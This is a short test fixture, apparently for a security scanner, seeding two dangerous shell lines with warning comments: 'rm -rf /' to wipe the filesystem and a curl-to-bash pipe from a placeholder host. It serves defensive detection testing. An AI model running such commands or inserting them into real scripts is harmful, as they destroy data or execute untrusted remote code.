// Seeded supply-chain / destructive-shell fixture, kept apart from the code
// fixture because these two rules only appear inside shell script text.

# WARNING: this wipes the entire filesystem root. Never run.
rm -rf /

# Pipe a downloaded script straight into a shell: whatever the server returns
# executes with the user's privileges, and there is no integrity check at all.
curl https://get.example.invalid/install.sh | bash